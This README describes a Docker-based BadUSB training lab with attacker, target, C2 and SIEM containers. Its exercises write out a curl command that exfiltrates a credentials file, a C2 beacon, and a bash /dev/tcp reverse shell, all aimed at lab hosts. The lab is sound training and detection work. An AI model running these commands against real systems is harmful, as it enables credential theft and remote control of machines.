# BadUSB Training Lab Environment

## Overview

This Docker-based lab provides an isolated environment for practicing BadUSB attacks and defenses without risking production systems.

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                        LAB NETWORK (172.20.0.0/24)                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────┐         │
│   │   Attacker   │    │ Target Linux │    │    SIEM      │         │
│   │   (Kali)     │    │   (Ubuntu)   │    │   (Wazuh)    │         │
│   │ 172.20.0.10  │    │ 172.20.0.20  │    │ 172.20.0.30  │         │
│   └──────────────┘    └──────────────┘    └──────────────┘         │
│                                                                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────┐         │
│   │  C2 Server   │    │  Web Server  │    │  DNS Server  │         │
│   │ 172.20.0.40  │    │ 172.20.0.50  │    │ 172.20.0.60  │         │
│   └──────────────┘    └──────────────┘    └──────────────┘         │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

## Quick Start

### Prerequisites

- Docker Engine 20.10+
- Docker Compose 2.0+
- 8GB RAM minimum (16GB recommended)
- 20GB free disk space

### Start the Lab

```bash
# Clone or navigate to lab directory
cd Lab_Environment

# Start all services
docker-compose up -d

# Check status
docker-compose ps

# View logs
docker-compose logs -f
```

### Access Services

| Service | Access | Credentials |
|---------|--------|-------------|
| Attacker SSH | `ssh root@localhost -p 2222` | root:toor |
| Target SSH | `ssh victim@localhost -p 2223` | victim:password123 |
| C2 Dashboard | http://localhost:8888/logs | N/A |
| Web Server | http://localhost:80 | N/A |
| SIEM API | http://localhost:55000 | admin:SecretPassword |

### Stop the Lab

```bash
# Stop all services
docker-compose down

# Stop and remove volumes (clean slate)
docker-compose down -v
```

## Services

### Attacker (172.20.0.10)

Kali-based attack platform with pre-installed tools:
- Payload development tools
- Network utilities (nmap, netcat, wireshark)
- Python with Flask, requests, scapy
- Hashcat, John the Ripper

**Key directories:**
- `/root/payloads` - Payload files (mounted from host)
- `/root/tools` - Custom tools
- `/root/loot` - Collected data
- `/root/scripts` - Helper scripts

### Target Linux (172.20.0.20)

Ubuntu-based target machine with:
- Standard user account (victim)
- Fake sensitive files for exfil testing
- Audit logging enabled
- SSH access

**Pre-planted files:**
- `/home/victim/.ssh/id_rsa` - Fake SSH key
- `/home/victim/Documents/confidential.txt` - Fake confidential doc
- `/home/victim/.credentials` - Fake credentials

### C2 Server (172.20.0.40)

Simple C2 simulation server endpoints:
- `GET /` - Health check
- `POST /beacon` - Beacon check-in
- `POST /collect` - Data exfiltration
- `POST /upload` - File upload
- `GET /logs` - View collected logs
- `GET /loot` - List loot files

### Web Server (172.20.0.50)

Nginx server for:
- Hosting payloads for download cradles
- Serving staged scripts
- Static file hosting

### SIEM (172.20.0.30)

Wazuh SIEM for:
- Log collection and analysis
- Alert generation
- Detection rule testing

## Lab Exercises

### Exercise 1: Basic Exfiltration

1. SSH to attacker: `ssh root@localhost -p 2222`
2. Start exfil server: `python3 /root/scripts/exfil_server.py`
3. From target, simulate data exfil:
   ```bash
   curl -X POST -d "data=$(cat /home/victim/.credentials)" http://172.20.0.10:8080/collect
   ```
4. Check attacker logs in `/root/loot/`

### Exercise 2: C2 Beaconing

1. Start C2 server (auto-started): http://localhost:8888
2. From target, simulate beacon:
   ```bash
   curl -X POST -H "Content-Type: application/json" \
     -d '{"hostname":"'$(hostname)'","user":"'$(whoami)'"}' \
     http://172.20.0.40:8888/beacon
   ```
3. View beacons: http://localhost:8888/logs

### Exercise 3: Reverse Shell

1. On attacker, start listener:
   ```bash
   nc -lvnp 4444
   ```
2. On target, connect back:
   ```bash
   bash -i >& /dev/tcp/172.20.0.10/4444 0>&1
   ```

### Exercise 4: Detection

1. Perform attacks from exercises 1-3
2. SSH to target and review logs:
   ```bash
   sudo tail -f /var/log/audit/audit.log
   ```
3. Access SIEM at http://localhost:55000

## Customization

### Adding Payloads

Place payload files in `./payloads/` directory:
```bash
echo "Your payload here" > ./payloads/test.ps1
```

Accessible from:
- Attacker: `/root/payloads/test.ps1`
- Web: http://172.20.0.50/test.ps1

### Adding Detection Rules

Edit `./siem/rules/local_rules.xml`:
```xml
<rule id="100001" level="10">
  <match>suspicious pattern</match>
  <description>Custom detection rule</description>
</rule>
```

### Network Modifications

Edit `docker-compose.yml` to:
- Add more targets
- Change IP addresses
- Add Windows containers (requires additional setup)

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Containers won't start | Check Docker daemon: `systemctl status docker` |
| Port already in use | Change port in docker-compose.yml |
| Can't reach between containers | Check network: `docker network inspect lab_network` |
| Out of disk space | Prune: `docker system prune -a` |

## Security Notice

```
⚠️ WARNING ⚠️

This lab is for AUTHORIZED TRAINING ONLY.

- Never expose these services to the internet
- Never use against systems you don't own
- Always run in isolated environment
- Delete lab data after training

The techniques learned here can cause real harm if misused.
Use responsibly and ethically.
```

---

[← Back to Main](../README.md)
